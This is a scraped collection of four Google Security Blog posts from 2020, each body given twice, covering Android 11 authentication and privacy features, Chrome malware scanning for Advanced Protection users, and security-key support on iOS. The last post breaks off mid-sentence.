{"website": "Google-Security", "title": "\nLockscreen and Authentication  Improvements in Android 11\n", "author": ["Posted by Haining Chen, Vishwath Mohan, Kevin Chyn and Liz Louis, Android Security Team"], "link": "https://security.googleblog.com/2020/09/lockscreen-and-authentication.html", "abstract": "                             Posted by Haining Chen, Vishwath Mohan, Kevin Chyn and Liz Louis, Android Security Team      [Cross-posted from the  Android Developers Blog ]          As phones become faster and smarter, they play increasingly important roles in our lives, functioning as our extended memory, our connection to the world at large, and often the primary interface for communication with friends, family, and wider communities. It is only natural that as part of this evolution, we&#8217;ve come to entrust our phones with our most private information, and in many ways treat them as extensions of our digital and physical identities.     This trust is paramount to the Android Security team. The team focuses on ensuring that Android devices respect the privacy and sensitivity of user data. A fundamental aspect of this work centers around the lockscreen, which acts as the proverbial front door to our devices. After all, the lockscreen  ensures  that only the intended user(s) of a device can access their private data.      This blog post outlines recent improvements around how users interact with the lockscreen on Android devices and more generally with authentication. In particular, we focus on two categories of authentication that present both immense potential as well as potentially immense risk if not designed well: biometrics and environmental modalities.     The tiered authentication model      Before getting into the details of lockscreen and authentication improvements, we first want to establish some context to help relate these improvements to each other. A good way to envision these changes is to fit them into the framework of the   tiered authentication model  , a conceptual classification of all the different authentication modalities on Android, how they relate to each other, and how they are constrained based on this classification.      The model itself is fairly simple, classifying authentication modalities into three buckets of decreasing levels of security and commensurately increasing constraints. The primary tier is the least constrained in the sense that users only need to re-enter a primary modality under certain situations (for example, after each boot or every 72 hours) in order to use its capability. The secondary and tertiary tiers are more constrained because they cannot be set up and used without having a primary modality enrolled first and they have more constraints further restricting their capabilities.               Primary Tier - Knowledge Factor  : The first tier consists of modalities that rely on knowledge factors, or something the user knows, for example, a PIN, pattern, or password. Good high-entropy knowledge factors, such as complex passwords that are hard to guess, offer the highest potential guarantee of identity.         Knowledge factors are especially useful on Android becauses devices offer hardware backed brute-force protection with exponential-backoff, meaning Android devices prevent attackers from repeatedly guessing a PIN, pattern, or password by having hardware backed timeouts after every 5 incorrect attempts. Knowledge factors also confer additional benefits to all users that use them, such as  File Based Encryption  (FBE) and  encrypted device backup .             Secondary Tier - Biometrics  : The second tier consists primarily of biometrics, or  something the user  is  . Face or fingerprint based authentications are examples of secondary authentication modalities. Biometrics offer a more convenient but potentially less secure way of confirming your identity with a device.       \tWe will delve into Android biometrics in the next section.     \t         The Tertiary Tier - Environmental  : The last tier includes modalities that rely on  something the user  has  . This could either be a physical token, such as with Smart Lock&#8217;s Trusted Devices where a phone can be unlocked when paired with a safelisted bluetooth device. Or it could be something inherent to the physical environment around the device, such as with Smart Lock&#8217;s Trusted Places where a phone can be unlocked when it is taken to a safelisted location.       Improvements to tertiary authentication           While both Trusted Places and Trusted Devices (and tertiary modalities in general) offer convenient ways to get access to the contents of your device, the fundamental issue they share is that they are ultimately a   poor proxy for user identity  . For example, an attacker could unlock a misplaced phone that uses Trusted Place simply by driving it past the user's home, or with moderate amount of effort, spoofing a GPS signal using off-the-shelf Software Defined Radios and some mild scripting. Similarly with Trusted Device, access to a safelisted bluetooth device also gives access to all data on the user&#8217;s phone.           Because of this, a major improvement has been made to the environmental tier in Android 10.   The Tertiary tier was switched from an active unlock mechanism into an extending unlock mechanism instead  . In this new mode, a tertiary tier modality can no longer unlock a locked device. Instead, if the device is first unlocked using either a primary or secondary modality, it can continue to keep it in the unlocked state for a maximum of four hours.        A closer look at Android biometrics      Biometric implementations come with a wide variety of security characteristics, so we rely on the following two key factors to determine the security of a particular implementation:         Architectural security  : The resilience of a biometric pipeline against kernel or platform compromise. A pipeline is considered secure if kernel and platform compromises don&#8217;t grant the ability to either read raw biometric data, or inject synthetic data into the pipeline to influence an authentication decision.     Spoofability  : Is measured using the Spoof Acceptance Rate (SAR). SAR is a metric first introduced in Android P, and is intended to measure how resilient a biometric is against a dedicated attacker. Read more about SAR and its measurement in  Measuring Biometric Unlock Security .       We use these two factors to classify biometrics into one of three different classes in decreasing order of security:       Class 3 (formerly Strong)   Class 2 (formerly Weak)   Class 1 (formerly Convenience)       Each class comes with an associated set of constraints that aim to balance their ease of use with the level of security they offer.      These constraints reflect the length of time before a biometric falls back to primary authentication, and the allowed application integration. For example, a Class 3 biometric enjoys the longest timeouts and offers all integration options for apps, while a Class 1 biometric has the shortest timeouts and no options for app integration. You can see a summary of the details in the table below, or the full details in the  Android Android Compatibility Definition Document  (CDD).            1  App integration means exposing an API to apps (e.g., via integration with BiometricPrompt/BiometricManager, androidx.biometric, or FIDO2 APIs)      2  Keystore integration means integrating Keystore, e.g., to release app auth-bound keys    Benefits and caveats      Biometrics provide convenience to users while maintaining a high level of security. Because users need to set up a primary authentication modality in order to use biometrics, it helps boost the lockscreen adoption (we see an average of 20% higher lockscreen adoption on devices that offer biometrics versus those that do not). This allows more users to benefit from the security features that  the lockscreen provides: gates unauthorized access to sensitive user data and also confers other advantages of a primary authentication modality to these users, such as encrypted backups. Finally, biometrics also help reduce  shoulder surfing  attacks in which an attacker tries to reproduce a PIN, pattern, or password after observing a user entering the credential.     However, it is important that users understand the trade-offs involved with the use of biometrics. Primary among these is that   no biometric system is foolproof. This is true not just on Android, but across all operating systems, form-factors, and technologies.   For example, a face biometric implementation might be fooled by family members who resemble the user or a 3D mask of the user. A fingerprint biometric implementation could potentially be bypassed by a spoof made from latent fingerprints of the user. Although anti-spoofing or Presentation Attack Detection (PAD) technologies have been actively developed to mitigate such spoofing attacks, they are mitigations, not preventions.      One effort that Android has made to mitigate the potential risk of using biometrics is the lockdown mode introduced in Android P. Android users can use this feature to temporarily disable biometrics, together with Smart Lock (for example, Trusted Places and Trusted Devices) as well as notifications on the lock screen, when they feel the need to do so.      To use the lockdown mode, users first need to set up a primary authentication modality and then enable it in settings. The exact setting where the lockdown mode can be enabled varies by device models, and on a Google Pixel 4 device it is under Settings > Display > Lock screen > Show lockdown option. Once enabled, users can trigger the lockdown mode by holding the power button and then clicking the Lockdown icon on the power menu. A device in lockdown mode will return to the non-lockdown state after a primary authentication modality (such as a PIN, pattern, or password) is used to unlock the device.    BiometricPrompt - New APIs      In order for developers to benefit from the security guarantee provided by Android biometrics and to easily integrate biometric authentication into their apps to better protect sensitive user data, we introduced the   BiometricPrompt   APIs in Android P.    There are several benefits of using the BiometricPrompt APIs. Most importantly, these APIs allow app developers to target biometrics in a modality-agnostic way across different Android devices (that is, BiometricPrompt can be used as a single integration point for various biometric modalities supported on devices), while controlling the security guarantees that the authentication needs to provide (such as requiring Class 3 or Class 2 biometrics, with device credential as a fallback). In this way, it helps protect app data with a second layer of defenses (in addition to the lockscreen) and in turn respects the sensitivity of user data. Furthermore, BiometricPrompt provides a persistent UI with customization options for certain information (for example, title and description), offering a consistent user experience across biometric modalities and across Android devices.     As shown in the following architecture diagram, apps can integrate with biometrics on Android devices through either the framework API or the support library (that is,   androidx.biometric   for backward compatibility). One thing to note is that  FingerprintManager  is deprecated because developers are encouraged to migrate to  BiometricPrompt  for modality-agnostic authentications.        Improvements to BiometricPrompt    Android 10 introduced the   BiometricManager   class that developers can use to query the availability of biometric authentication and included fingerprint and face authentication integration for  BiometricPrompt .    In Android 11, we introduce new features such as the  BiometricManager.Authenticators  interface which allows developers to specify the authentication types accepted by their apps, as well as additional support for auth-per-use keys within the  BiometricPrompt  class.      More details can be found in the  Android 11 preview  and  Android Biometrics  documentation. Read more about  BiometricPrompt  API usage in our blog post  Using BiometricPrompt with CryptoObject: How and Why  and our codelab  Login with Biometrics on Android .                                     Posted by Haining Chen, Vishwath Mohan, Kevin Chyn and Liz Louis, Android Security Team  [Cross-posted from the Android Developers Blog]   As phones become faster and smarter, they play increasingly important roles in our lives, functioning as our extended memory, our connection to the world at large, and often the primary interface for communication with friends, family, and wider communities. It is only natural that as part of this evolution, we’ve come to entrust our phones with our most private information, and in many ways treat them as extensions of our digital and physical identities.   This trust is paramount to the Android Security team. The team focuses on ensuring that Android devices respect the privacy and sensitivity of user data. A fundamental aspect of this work centers around the lockscreen, which acts as the proverbial front door to our devices. After all, the lockscreen ensures that only the intended user(s) of a device can access their private data.    This blog post outlines recent improvements around how users interact with the lockscreen on Android devices and more generally with authentication. In particular, we focus on two categories of authentication that present both immense potential as well as potentially immense risk if not designed well: biometrics and environmental modalities.   The tiered authentication model    Before getting into the details of lockscreen and authentication improvements, we first want to establish some context to help relate these improvements to each other. A good way to envision these changes is to fit them into the framework of the tiered authentication model, a conceptual classification of all the different authentication modalities on Android, how they relate to each other, and how they are constrained based on this classification.    The model itself is fairly simple, classifying authentication modalities into three buckets of decreasing levels of security and commensurately increasing constraints. The primary tier is the least constrained in the sense that users only need to re-enter a primary modality under certain situations (for example, after each boot or every 72 hours) in order to use its capability. The secondary and tertiary tiers are more constrained because they cannot be set up and used without having a primary modality enrolled first and they have more constraints further restricting their capabilities.     Primary Tier - Knowledge Factor: The first tier consists of modalities that rely on knowledge factors, or something the user knows, for example, a PIN, pattern, or password. Good high-entropy knowledge factors, such as complex passwords that are hard to guess, offer the highest potential guarantee of identity.        Knowledge factors are especially useful on Android becauses devices offer hardware backed brute-force protection with exponential-backoff, meaning Android devices prevent attackers from repeatedly guessing a PIN, pattern, or password by having hardware backed timeouts after every 5 incorrect attempts. Knowledge factors also confer additional benefits to all users that use them, such as File Based Encryption (FBE) and encrypted device backup.      Secondary Tier - Biometrics: The second tier consists primarily of biometrics, or something the user is. Face or fingerprint based authentications are examples of secondary authentication modalities. Biometrics offer a more convenient but potentially less secure way of confirming your identity with a device.    \tWe will delve into Android biometrics in the next section.   \t    The Tertiary Tier - Environmental: The last tier includes modalities that rely on something the user has. This could either be a physical token, such as with Smart Lock’s Trusted Devices where a phone can be unlocked when paired with a safelisted bluetooth device. Or it could be something inherent to the physical environment around the device, such as with Smart Lock’s Trusted Places where a phone can be unlocked when it is taken to a safelisted location.      Improvements to tertiary authentication         While both Trusted Places and Trusted Devices (and tertiary modalities in general) offer convenient ways to get access to the contents of your device, the fundamental issue they share is that they are ultimately a poor proxy for user identity. For example, an attacker could unlock a misplaced phone that uses Trusted Place simply by driving it past the user's home, or with moderate amount of effort, spoofing a GPS signal using off-the-shelf Software Defined Radios and some mild scripting. Similarly with Trusted Device, access to a safelisted bluetooth device also gives access to all data on the user’s phone.         Because of this, a major improvement has been made to the environmental tier in Android 10. The Tertiary tier was switched from an active unlock mechanism into an extending unlock mechanism instead. In this new mode, a tertiary tier modality can no longer unlock a locked device. Instead, if the device is first unlocked using either a primary or secondary modality, it can continue to keep it in the unlocked state for a maximum of four hours.    A closer look at Android biometrics    Biometric implementations come with a wide variety of security characteristics, so we rely on the following two key factors to determine the security of a particular implementation:    Architectural security: The resilience of a biometric pipeline against kernel or platform compromise. A pipeline is considered secure if kernel and platform compromises don’t grant the ability to either read raw biometric data, or inject synthetic data into the pipeline to influence an authentication decision.  Spoofability: Is measured using the Spoof Acceptance Rate (SAR). SAR is a metric first introduced in Android P, and is intended to measure how resilient a biometric is against a dedicated attacker. Read more about SAR and its measurement in Measuring Biometric Unlock Security.    We use these two factors to classify biometrics into one of three different classes in decreasing order of security:    Class 3 (formerly Strong)  Class 2 (formerly Weak)  Class 1 (formerly Convenience)    Each class comes with an associated set of constraints that aim to balance their ease of use with the level of security they offer.    These constraints reflect the length of time before a biometric falls back to primary authentication, and the allowed application integration. For example, a Class 3 biometric enjoys the longest timeouts and offers all integration options for apps, while a Class 1 biometric has the shortest timeouts and no options for app integration. You can see a summary of the details in the table below, or the full details in the Android Android Compatibility Definition Document (CDD).    1 App integration means exposing an API to apps (e.g., via integration with BiometricPrompt/BiometricManager, androidx.biometric, or FIDO2 APIs)   2 Keystore integration means integrating Keystore, e.g., to release app auth-bound keys  Benefits and caveats    Biometrics provide convenience to users while maintaining a high level of security. Because users need to set up a primary authentication modality in order to use biometrics, it helps boost the lockscreen adoption (we see an average of 20% higher lockscreen adoption on devices that offer biometrics versus those that do not). This allows more users to benefit from the security features that  the lockscreen provides: gates unauthorized access to sensitive user data and also confers other advantages of a primary authentication modality to these users, such as encrypted backups. Finally, biometrics also help reduce shoulder surfing attacks in which an attacker tries to reproduce a PIN, pattern, or password after observing a user entering the credential.   However, it is important that users understand the trade-offs involved with the use of biometrics. Primary among these is that no biometric system is foolproof. This is true not just on Android, but across all operating systems, form-factors, and technologies. For example, a face biometric implementation might be fooled by family members who resemble the user or a 3D mask of the user. A fingerprint biometric implementation could potentially be bypassed by a spoof made from latent fingerprints of the user. Although anti-spoofing or Presentation Attack Detection (PAD) technologies have been actively developed to mitigate such spoofing attacks, they are mitigations, not preventions.    One effort that Android has made to mitigate the potential risk of using biometrics is the lockdown mode introduced in Android P. Android users can use this feature to temporarily disable biometrics, together with Smart Lock (for example, Trusted Places and Trusted Devices) as well as notifications on the lock screen, when they feel the need to do so.    To use the lockdown mode, users first need to set up a primary authentication modality and then enable it in settings. The exact setting where the lockdown mode can be enabled varies by device models, and on a Google Pixel 4 device it is under Settings > Display > Lock screen > Show lockdown option. Once enabled, users can trigger the lockdown mode by holding the power button and then clicking the Lockdown icon on the power menu. A device in lockdown mode will return to the non-lockdown state after a primary authentication modality (such as a PIN, pattern, or password) is used to unlock the device.  BiometricPrompt - New APIs    In order for developers to benefit from the security guarantee provided by Android biometrics and to easily integrate biometric authentication into their apps to better protect sensitive user data, we introduced the BiometricPrompt APIs in Android P.   There are several benefits of using the BiometricPrompt APIs. Most importantly, these APIs allow app developers to target biometrics in a modality-agnostic way across different Android devices (that is, BiometricPrompt can be used as a single integration point for various biometric modalities supported on devices), while controlling the security guarantees that the authentication needs to provide (such as requiring Class 3 or Class 2 biometrics, with device credential as a fallback). In this way, it helps protect app data with a second layer of defenses (in addition to the lockscreen) and in turn respects the sensitivity of user data. Furthermore, BiometricPrompt provides a persistent UI with customization options for certain information (for example, title and description), offering a consistent user experience across biometric modalities and across Android devices.   As shown in the following architecture diagram, apps can integrate with biometrics on Android devices through either the framework API or the support library (that is, androidx.biometric for backward compatibility). One thing to note is that FingerprintManager is deprecated because developers are encouraged to migrate to BiometricPrompt for modality-agnostic authentications.  Improvements to BiometricPrompt  Android 10 introduced the BiometricManager class that developers can use to query the availability of biometric authentication and included fingerprint and face authentication integration for BiometricPrompt.   In Android 11, we introduce new features such as the BiometricManager.Authenticators interface which allows developers to specify the authentication types accepted by their apps, as well as additional support for auth-per-use keys within the BiometricPrompt class.    More details can be found in the Android 11 preview and Android Biometrics documentation. Read more about BiometricPrompt API usage in our blog post Using BiometricPrompt with CryptoObject: How and Why and our codelab Login with Biometrics on Android.      ", "date": "September 22, 2020"},
{"website": "Google-Security", "title": "\nImproved malware protection for users in the Advanced Protection Program\n", "author": ["Posted by Daniel Rubery, Software Engineer, Chrome, Ryan Rasti, Software Engineer, Safe Browsing, and Eric Mill, Product Manager, Chrome Security"], "link": "https://security.googleblog.com/2020/09/improved-malware-protection-for-users.html", "abstract": "                             Posted by Daniel Rubery, Software Engineer, Chrome, Ryan Rasti, Software Engineer, Safe Browsing, and Eric Mill, Product Manager, Chrome Security            Google&#8217;s  Advanced Protection Program  helps secure people at higher risk of targeted online attacks, like journalists, political organizations, and activists, with a set of constantly evolving safeguards that reflect today&#8217;s threat landscape. Chrome is always exploring new options to help all of our users better protect themselves against common online threats like malware. As a first step, today Chrome is expanding its download scanning options for users of Advanced Protection.     Advanced Protection users are already well-protected from phishing. As a result, we&#8217;ve seen that attackers target these users through other means, such as leading them to download malware. In August 2019, Chrome  began warning Advanced Protection users when a downloaded file may be malicious .     Now, in addition to this warning, Chrome is giving Advanced Protection users the ability to send risky files to be scanned by Google Safe Browsing&#8217;s full suite of malware detection technology before opening the file. We expect these cloud-hosted scans to significantly improve our ability to detect when these files are malicious.             When a user downloads a file, Safe Browsing will perform a quick check using metadata, such as hashes of the file, to evaluate whether it appears potentially suspicious. For any downloads that Safe Browsing deems risky, but not clearly unsafe, the user will be presented with a warning and the ability to send the file to be scanned. If the user chooses to send the file, Chrome will upload it to Google Safe Browsing, which will scan it using its static and dynamic analysis techniques in real time. After a short wait, if Safe Browsing determines the file is unsafe, Chrome will warn the user. As always, users can bypass the warning and open the file without scanning, if they are confident the file is safe. Safe Browsing deletes uploaded files a short time after scanning.       Online threats are constantly changing, and it's important that users&#8217; security protections automatically evolve as well. With the US election fast approaching, for example, Advanced Protection could be useful to members of political campaigns whose accounts are now more likely to be targeted. If you&#8217;re a user at high-risk of attack, visit  g.co/advancedprotection  to enroll in the Advanced Protection Program.                                     Posted by Daniel Rubery, Software Engineer, Chrome, Ryan Rasti, Software Engineer, Safe Browsing, and Eric Mill, Product Manager, Chrome Security Google’s Advanced Protection Program helps secure people at higher risk of targeted online attacks, like journalists, political organizations, and activists, with a set of constantly evolving safeguards that reflect today’s threat landscape. Chrome is always exploring new options to help all of our users better protect themselves against common online threats like malware. As a first step, today Chrome is expanding its download scanning options for users of Advanced Protection.   Advanced Protection users are already well-protected from phishing. As a result, we’ve seen that attackers target these users through other means, such as leading them to download malware. In August 2019, Chrome began warning Advanced Protection users when a downloaded file may be malicious.   Now, in addition to this warning, Chrome is giving Advanced Protection users the ability to send risky files to be scanned by Google Safe Browsing’s full suite of malware detection technology before opening the file. We expect these cloud-hosted scans to significantly improve our ability to detect when these files are malicious.         When a user downloads a file, Safe Browsing will perform a quick check using metadata, such as hashes of the file, to evaluate whether it appears potentially suspicious. For any downloads that Safe Browsing deems risky, but not clearly unsafe, the user will be presented with a warning and the ability to send the file to be scanned. If the user chooses to send the file, Chrome will upload it to Google Safe Browsing, which will scan it using its static and dynamic analysis techniques in real time. After a short wait, if Safe Browsing determines the file is unsafe, Chrome will warn the user. As always, users can bypass the warning and open the file without scanning, if they are confident the file is safe. Safe Browsing deletes uploaded files a short time after scanning.  Online threats are constantly changing, and it's important that users’ security protections automatically evolve as well. With the US election fast approaching, for example, Advanced Protection could be useful to members of political campaigns whose accounts are now more likely to be targeted. If you’re a user at high-risk of attack, visit g.co/advancedprotection to enroll in the Advanced Protection Program.      ", "date": "September 16, 2020"},
{"website": "Google-Security", "title": "\nMaking the Advanced Protection Program and Titan Security Keys easier to use on Apple iOS devices\n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud "], "link": "https://security.googleblog.com/2020/06/making-advanced-protection-program-and.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud&nbsp;       Starting today, we&#8217;re rolling out a change that enables native support for the  W3C WebAuthn  implementation for Google Accounts on Apple devices running iOS 13.3 and above. This capability, available for both personal and work Google Accounts, simplifies your security key experience on compatible iOS devices and allows you to use more types of security keys for your Google Account and the  Advanced Protection Program .                  Using an NFC security key on iPhone           More security key choices for users        Both the USB-A and Bluetooth  Titan Security Keys  have NFC functionality built-in. This allows you to tap your key to the back of your iPhone when prompted at sign-in.   You can use a Lightning security key like the  YubiKey 5Ci  or any USB security key if you have an  Apple Lightning to USB Camera Adapter.    You can plug a USB-C security key in directly to an iOS device that has a USB-C port (such as an iPad Pro).   We suggest installing the  Smart Lock app  in order to use Bluetooth security keys and your phone&#8217;s built-in security key, which allows you to use your  iPhone as an additional security key  for your Google Account.    In order to add your Google Account to your iOS device, navigate to &#8220;Settings &gt; Passwords &amp; Accounts&#8221; on your iOS device or install the Google app and sign in.            Account security best practices               We highly recommend users at a higher risk of targeted attacks to get security keys (such as  Titan Security Key  or your  Android or iOS phone ) and enroll into the  Advanced Protection Program . If you&#8217;re working for political committees in the United States, you may be eligible to  request free Titan Security Keys  through the Defending Digital Campaigns to get help enrolling into Advanced Protection.        You can also use security keys for any site where FIDO security keys are supported for 2FA, including your personal or work  Google Account ,  1Password ,  Bitbucket ,  Bitfinex ,  Coinbase ,  Dropbox ,  Facebook ,  GitHub ,  Salesforce ,  Stripe ,  Twitter , and more.                                       Posted by Christiaan Brand, Product Manager, Google Cloud    Starting today, we’re rolling out a change that enables native support for the W3C WebAuthn implementation for Google Accounts on Apple devices running iOS 13.3 and above. This capability, available for both personal and work Google Accounts, simplifies your security key experience on compatible iOS devices and allows you to use more types of security keys for your Google Account and the Advanced Protection Program.       Using an NFC security key on iPhone    More security key choices for users   Both the USB-A and Bluetooth Titan Security Keys have NFC functionality built-in. This allows you to tap your key to the back of your iPhone when prompted at sign-in. You can use a Lightning security key like the YubiKey 5Ci or any USB security key if you have an Apple Lightning to USB Camera Adapter. You can plug a USB-C security key in directly to an iOS device that has a USB-C port (such as an iPad Pro). We suggest installing the Smart Lock app in order to use Bluetooth security keys and your phone’s built-in security key, which allows you to use your iPhone as an additional security key for your Google Account.  In order to add your Google Account to your iOS device, navigate to “Settings > Passwords & Accounts” on your iOS device or install the Google app and sign in.     Account security best practices      We highly recommend users at a higher risk of targeted attacks to get security keys (such as Titan Security Key or your Android or iOS phone) and enroll into the Advanced Protection Program. If you’re working for political committees in the United States, you may be eligible to request free Titan Security Keys through the Defending Digital Campaigns to get help enrolling into Advanced Protection.    You can also use security keys for any site where FIDO security keys are supported for 2FA, including your personal or work Google Account, 1Password, Bitbucket, Bitfinex, Coinbase, Dropbox, Facebook, GitHub, Salesforce, Stripe, Twitter, and more.      ", "date": "June 3, 2020"},
{"website": "Google-Security", "title": "\n11 Weeks of Android: Privacy and Security\n", "author": ["Posted by Charmaine D'Silva, Product Lead, Android Privacy and Framework, Narayan Kamath, Engineering Lead, Android Privacy and Framework, Stephan Somogyi, Product Lead, Android Security and Sudhi Herle, Engineering Lead, Android Security "], "link": "https://security.googleblog.com/2020/06/11-weeks-of-android-privacy-and-security_29.html", "abstract": "                             Posted by Charmaine D'Silva, Product Lead, Android Privacy and Framework, Narayan Kamath, Engineering Lead, Android Privacy and Framework, Stephan Somogyi, Product Lead, Android Security and Sudhi Herle, Engineering Lead, Android Security       This blog post is part of a weekly series for  #11WeeksOfAndroid . For each  #11WeeksOfAndroid , we&#8217;re diving into a key area so you don&#8217;t miss anything. This week, we spotlighted  Privacy and Security ; here&#8217;s a look at what you should know.             Privacy and security is core to how we design Android, and with every new release we increase our investment in this space. Android 11 continues to make important strides in these areas, and this week we&#8217;ll be sharing a series of updates and resources about Android privacy and security. But first, let&#8217;s take a quick look at some of the most important changes we&#8217;ve made in Android 11 to protect user privacy and make the platform more secure.     As shared in the &#8220; All things privacy in Android 11 &#8221; video, we&#8217;re giving users even more control over sensitive permissions. Throughout the development of this release, we have engaged deeply and frequently with our developer community to design these features in a balanced way - amplifying user privacy while minimizing developer impact. Let&#8217;s go over some of these features:      One-time permission : In Android 10, we introduced a granular location permission that allows users to limit access to location only when an app is in use (aka foreground only). When presented with the new runtime permissions options, users choose foreground only location more than 50% of the time. This demonstrated to us that users really wanted finer controls for permissions. So in Android 11, we&#8217;ve introduced  one time permissions  that let users give an app access to the device microphone, camera, or location, just that one time. As an app developer, there are no changes that you need to make to your app for it to work with one time permissions, and the app can request permissions again the next time the app is used. Learn more about building privacy-friendly apps with these new changes  in this video .      Background location:  In Android 10 we added a background location usage reminder so users can see how apps are using this sensitive data on a regular basis. Users who interacted with the reminder either downgraded or denied the location permission over 75% of the time. In addition, we have done extensive research and believe that there are very few legitimate use cases for apps to require access to location in the background.      In Android 11, background location will no longer be a permission that a user can grant via a run time prompt and it will require a more deliberate action. If your app needs background location, the system will ensure that the app first asks for foreground location. The app can then broaden its access to background location through a separate permission request, which will cause the system to take the user to Settings in order to complete the permission grant.     In February, we  announced  that Google Play developers will need to get approval to access background location in their app to prevent misuse. We're giving developers more time to make changes and won't be enforcing the policy for existing apps until 2021. Check out this helpful video  to find possible background location usage in your code .      Permissions auto-reset:  Most users tend to download and install over 60 apps on their device but interact with only a third of these apps on a regular basis. If users haven&#8217;t used an app that targets Android 11 for an extended period of time, the system will &#8220; auto-reset &#8221; all of the granted runtime permissions associated with the app and notify the user. The app can request the permissions again the next time the app is used. If you have an app that has a legitimate need to retain permissions, you can prompt users to turn this feature OFF for your app in Settings.      Data access auditing APIs:  Android encourages developers to limit their access to sensitive data, even if they have been granted permission to do so. In Android 11, developers will have access to  new APIs  that will give them more transparency into their app&#8217;s usage of private and protected data. The APIs will enable apps to track when the system records the app&#8217;s access to private user data.      Scoped Storage:  In Android 10, we introduced  scoped storage  which provides a filtered view into external storage, giving access to app-specific files and media collections. This change protects user privacy by limiting broad access to shared storage in many ways including changing the storage permission to only give read access to photos, videos and music and improving app storage attribution. Since Android 10, we&#8217;ve incorporated developer feedback and made many improvements to help developers adopt scoped storage, including: updated permission UI to enhance user experience, direct file path access to media to improve compatibility with existing libraries, updated APIs for modifying media,  Manage External Storage  permission to enable select use cases that need broad files access, and protected external app directories. In Android 11, scoped storage will be mandatory for all apps that target API level 30. Learn more in this  video  and check out the  developer documentation  for further details.       Google Play system updates:  Google Play system updates were introduced with Android 10 as part of  Project Mainline . Their main benefit is to increase the modularity and granularity of platform subsystems within Android so we can update core OS components without needing a full OTA update from your phone manufacturer. Earlier this year, thanks to Project Mainline, we were able to quickly fix a critical vulnerability in the media decoding subsystem. Android 11 adds new modules, and maintains the security properties of existing ones. For example, Conscrypt, which provides cryptographic primitives, maintained its FIPS validation in Android 11 as well.      BiometricPrompt API:  Developers can now use the  BiometricPrompt API  to specify the biometric authenticator strength required by their app to unlock or access sensitive parts of the app. We are planning to add this to the  Jetpack Biometric library  to allow for backward compatibility and will share further updates on this work as it progresses.       Identity Credential API:  This will unlock new use cases such as mobile drivers licences, National ID, and Digital ID. It&#8217;s being built by our security team to ensure this information is stored safely, using security hardware to secure and control access to the data, in a way that  enhances user privacy  as compared to traditional physical documents. We&#8217;re working with various government agencies and industry partners to make sure that Android 11 is ready for such digital-first identity experiences.     Thank you for your flexibility and feedback as we continue to build an increasingly more private and secure platform. You can learn about more features in the  Android 11 Beta developer site . You can also learn about general best practices related to  privacy  and  security .       Please follow Android Developers on  Twitter  and  Youtube  to catch helpful content and materials in this area all this week.      Resources       You can find the entire playlist of #11WeeksOfAndroid video content  here , and learn more about each week  here . We&#8217;ll continue to spotlight new areas each week, so  keep an eye out  and follow us on  Twitter  and  YouTube . Thanks so much for letting us be a part of this experience with you!                                        Posted by Charmaine D'Silva, Product Lead, Android Privacy and Framework, Narayan Kamath, Engineering Lead, Android Privacy and Framework, Stephan Somogyi, Product Lead, Android Security and Sudhi Herle, Engineering Lead, Android Security    This blog post is part of a weekly series for #11WeeksOfAndroid. For each #11WeeksOfAndroid, we’re diving into a key area so you don’t miss anything. This week, we spotlighted Privacy and Security; here’s a look at what you should know.       Privacy and security is core to how we design Android, and with every new release we increase our investment in this space. Android 11 continues to make important strides in these areas, and this week we’ll be sharing a series of updates and resources about Android privacy and security. But first, let’s take a quick look at some of the most important changes we’ve made in Android 11 to protect user privacy and make the platform more secure.   As shared in the “All things privacy in Android 11” video, we’re giving users even more control over sensitive permissions. Throughout the development of this release, we have engaged deeply and frequently with our developer community to design these features in a balanced way - amplifying user privacy while minimizing developer impact. Let’s go over some of these features:   One-time permission: In Android 10, we introduced a granular location permission that allows users to limit access to location only when an app is in use (aka foreground only). When presented with the new runtime permissions options, users choose foreground only location more than 50% of the time. This demonstrated to us that users really wanted finer controls for permissions. So in Android 11, we’ve introduced one time permissions that let users give an app access to the device microphone, camera, or location, just that one time. As an app developer, there are no changes that you need to make to your app for it to work with one time permissions, and the app can request permissions again the next time the app is used. Learn more about building privacy-friendly apps with these new changes in this video.   Background location: In Android 10 we added a background location usage reminder so users can see how apps are using this sensitive data on a regular basis. Users who interacted with the reminder either downgraded or denied the location permission over 75% of the time. In addition, we have done extensive research and believe that there are very few legitimate use cases for apps to require access to location in the background.    In Android 11, background location will no longer be a permission that a user can grant via a run time prompt and it will require a more deliberate action. If your app needs background location, the system will ensure that the app first asks for foreground location. The app can then broaden its access to background location through a separate permission request, which will cause the system to take the user to Settings in order to complete the permission grant.   In February, we announced that Google Play developers will need to get approval to access background location in their app to prevent misuse. We're giving developers more time to make changes and won't be enforcing the policy for existing apps until 2021. Check out this helpful video to find possible background location usage in your code.   Permissions auto-reset: Most users tend to download and install over 60 apps on their device but interact with only a third of these apps on a regular basis. If users haven’t used an app that targets Android 11 for an extended period of time, the system will “auto-reset” all of the granted runtime permissions associated with the app and notify the user. The app can request the permissions again the next time the app is used. If you have an app that has a legitimate need to retain permissions, you can prompt users to turn this feature OFF for your app in Settings.   Data access auditing APIs: Android encourages developers to limit their access to sensitive data, even if they have been granted permission to do so. In Android 11, developers will have access to new APIs that will give them more transparency into their app’s usage of private and protected data. The APIs will enable apps to track when the system records the app’s access to private user data.   Scoped Storage: In Android 10, we introduced scoped storage which provides a filtered view into external storage, giving access to app-specific files and media collections. This change protects user privacy by limiting broad access to shared storage in many ways including changing the storage permission to only give read access to photos, videos and music and improving app storage attribution. Since Android 10, we’ve incorporated developer feedback and made many improvements to help developers adopt scoped storage, including: updated permission UI to enhance user experience, direct file path access to media to improve compatibility with existing libraries, updated APIs for modifying media, Manage External Storage permission to enable select use cases that need broad files access, and protected external app directories. In Android 11, scoped storage will be mandatory for all apps that target API level 30. Learn more in this video and check out the developer documentation for further details.    Google Play system updates: Google Play system updates were introduced with Android 10 as part of Project Mainline. Their main benefit is to increase the modularity and granularity of platform subsystems within Android so we can update core OS components without needing a full OTA update from your phone manufacturer. Earlier this year, thanks to Project Mainline, we were able to quickly fix a critical vulnerability in the media decoding subsystem. Android 11 adds new modules, and maintains the security properties of existing ones. For example, Conscrypt, which provides cryptographic primitives, maintained its FIPS validation in Android 11 as well.   BiometricPrompt API: Developers can now use the BiometricPrompt API to specify the biometric authenticator strength required by their app to unlock or access sensitive parts of the app. We are planning to add this to the Jetpack Biometric library to allow for backward compatibility and will share further updates on this work as it progresses.    Identity Credential API: This will unlock new use cases such as mobile drivers licences, National ID, and Digital ID. It’s being built by our security team to ensure this information is stored safely, using security hardware to secure and control access to the data, in a way that enhances user privacy as compared to traditional physical documents. We’re working with various 